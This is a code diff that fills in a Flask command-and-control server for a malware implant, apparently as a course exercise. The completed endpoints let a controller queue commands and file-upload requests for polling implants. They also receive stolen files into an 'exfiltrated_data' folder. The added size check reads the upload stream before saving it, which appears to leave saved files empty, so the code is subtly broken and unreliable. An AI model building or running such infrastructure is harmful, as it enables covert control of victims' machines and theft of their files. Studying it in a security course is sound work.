@@ -16,15 +16,14 @@ command_menu = {
 }
 
 # Queue of tasks assigned to the implant
-tasks = []
+tasks = Queue()
 
 # A controller can invoke the default endpoint to view the command menu
 @app.route('/')
 def menu():
-    return json.dumps(command_menu)
+    return jsonify(command_menu)
 
 # A controller can invoke this endpoint to task the client
-# Task #6 is a special task to request a specific file
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
 def assign_command(cmd_index):
     if 0 <= cmd_index < len(command_menu):
@@ -32,30 +31,23 @@ def assign_command(cmd_index):
             data = request.get_json()
             path = data.get('path')
             if not path:
-                return json.dumps({"error": "Missing 'path'"}), 400
-            tasks.append(f"upload {path}")
-            return json.dumps({"message": f"Queued upload: {path}"})
+                return jsonify({"error": "Missing 'path'"}), 400
+            tasks.put(f"upload {path}")
+            return jsonify({"message": f"Queued upload: {path}"})
         else:
-            tasks.append(command_menu[cmd_index])
-            return json.dumps({"message": f"Queued: {command_menu[cmd_index]}"})
+            tasks.put(command_menu[cmd_index])
+            return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
     else:
-        return json.dumps({"error": "Bad Request"})
-
-    
-    
-# TODO
-# Dummy GET
-@app.route('/dummy_get', methods=['GET'])
-def dummy_get():
-    return
+        return jsonify({"error": "Bad Request"}), 400
 
 
-# TODO
 # Implant periodically polls this endpoint to get a task
-# If there are no tasks in the queue, I suggest sending "sleep 10"
 @app.route('/task', methods=['POST'])
 def get_task():
-    return 
+    if not tasks.empty():
+        task = tasks.get()
+        return jsonify({"task": task})
+    return jsonify({"task": "sleep 10"})
 
 
 # Implant invokes this endpoint to send images back to the server
@@ -69,13 +61,17 @@ def receive_data():
         # Make sure directory exists
         os.makedirs('exfiltrated_data', exist_ok=True)
 
+        # Check for file size (e.g., 10MB limit)
+        if len(file.read()) > 10 * 1024 * 1024:  # 10MB limit
+            return jsonify({"error": "File size exceeds 10MB"}), 400
+
         # Save the uploaded file
         file.save(save_path)
 
-        print(f"[+] Received and saved file: {filename}")
-        return json.dumps({"status": "File received"})
+        print(f"Received and saved file: {filename}")
+        return jsonify({"status": "File received"})
     else:
-        return json.dumps({"error": "No file provided"}), 400
+        return jsonify({"error": "No file provided"}), 400
 
 
 if __name__ == '__main__':
